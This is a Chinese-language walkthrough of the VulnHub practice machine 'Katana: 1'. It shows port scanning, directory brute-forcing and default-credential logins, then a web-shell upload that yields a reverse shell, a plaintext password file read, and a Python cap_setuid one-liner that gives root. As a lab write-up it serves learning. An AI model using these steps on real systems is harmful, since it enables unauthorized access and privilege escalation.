# Katana: 1

2024-5-19 https://www.vulnhub.com/entry/katana-1,482/

difficulty: Intermediate

## IP

192.168.10.181

## Scan

Open Port -> 21,22,80,139,445,7080,8088,8715

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 894f3a5401f8dcb66ee078fc60a6de35 (RSA)
|   256 ddaccc4e43816be32df312a13e4ba322 (ECDSA)
|_  256 cce625c0c6119f88f6c4261edefae98b (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2020-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
| tls-alpn:
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
|_http-title: Katana X
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
8715/tcp open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
```

开放的端口比较多，21 ftp 不能匿名登陆，无法获取信息。

有 smb，先看看有没有映射信息：

```
enum4linux -a 192.168.10.181

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
```

没有自定义映射信息。

看看 80 的 apache web 服务上有什么信息，http://192.168.10.181/ 首页默认是一张图片，使用 gobuster 进行扫描：

```
gobuster dir -u http://192.168.10.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e
```

找到了一个入口链接 http://192.168.10.181/ebook ，这个页面是个老演员了，登陆凭据是 admin:admin，是个弱密钥。但是这次在进入编辑图书的图片后，提交时出现 404，估计是设计靶场的人修改了后台程序，变成了兔子洞。

继续看其他的端口，还有一个 8715 端口的 nginx，看看有什么，访问后，弹出个 http 认证，输入 admin:admin 竟然神奇的通过了验证，但是页面显示的还是一个武士刀，没什么用。

现在只剩 LiteSpeed 这个服务了，7080 是个 ssl，没找到有用信息，8088 端口经过目录扫描后，发现了一些信息：

```
gobuster dir -u http://192.168.10.181:8088/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.10.181:8088/index.html           (Status: 200) [Size: 655]
http://192.168.10.181:8088/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/cgi-bin/]
http://192.168.10.181:8088/img                  (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/img/]
http://192.168.10.181:8088/docs                 (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/docs/]
http://192.168.10.181:8088/upload.html          (Status: 200) [Size: 6480]
http://192.168.10.181:8088/upload.php           (Status: 200) [Size: 1800]
http://192.168.10.181:8088/css                  (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/css/]
http://192.168.10.181:8088/protected            (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/protected/]
http://192.168.10.181:8088/blocked              (Status: 301) [Size: 1260] [--> http://192.168.10.181:8088/blocked/]
http://192.168.10.181:8088/phpinfo.php          (Status: 200) [Size: 50735]
```

其中 http://192.168.10.181:8088/upload.html 是一个文件上传的页面，提交的请求到 upload.php 页面上了。

/phpinfo.php 中看到了 web root 的目录：/usr/local/lsws/Example/html

在 upload 页面上传了 web shell 之后，发现页面保存在 /opt/manager/html/katana_8888.php 中，不是这个 LiteSpeed 的 web 目录。

但是这个 /opt/manager/html 好像也是一个 web 页面，能不能是那个 8715 对应的 nginx 服务，尝试进行访问，并在 kali 上先建立监听：

```
curl http://192.168.10.181:8715/katana_8888.php
```

果然在 kali 上得到了反弹的 shell。目标机器上有 python，先升级下 tty。

开始进行信息枚举，/home 目录中只有一个用户：katana，在它的目录下，发现了密码文件：

```
www-data@katana:/home/katana$ cat .ssh_passwd
katana@katana12345
```

katana 的密码为:katana12345，su 切换到该用户，继续寻找提权到 root 的路径。

该用户没有 sudo 权限，suid 中也没有特殊的可利用程序。

通过枚举，发现 cap:

```
katana@katana:~$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep

root@katana:/root# ls -al /usr/bin/python2.7
-rwxr-xr-x 1 root root 3689352 Oct 10  2019 /usr/bin/python2.7
```

root 的所属用户，进行利用：

```
katana@katana:~$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:~# id
uid=0(root) gid=1000(katana) groups=1000(katana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
root@katana:~# cd /root
root@katana:/root# ls -al
total 44
drwx------  4 root root 4096 May 11  2020 .
drwxr-xr-x 18 root root 4096 May 11  2020 ..
-rw-------  1 root root  563 May 11  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 May 11  2020 .gnupg
drwxr-xr-x  3 root root 4096 May 11  2020 .local
-rw-------  1 root root  155 May 11  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   22 May 11  2020 root.txt
-rw-r--r--  1 root root   66 May 11  2020 .selected_editor
-rw-r--r--  1 root root  209 May 11  2020 .wget-hsts
root@katana:/root# cat root.txt
{R00t_key_Katana_91!}
```
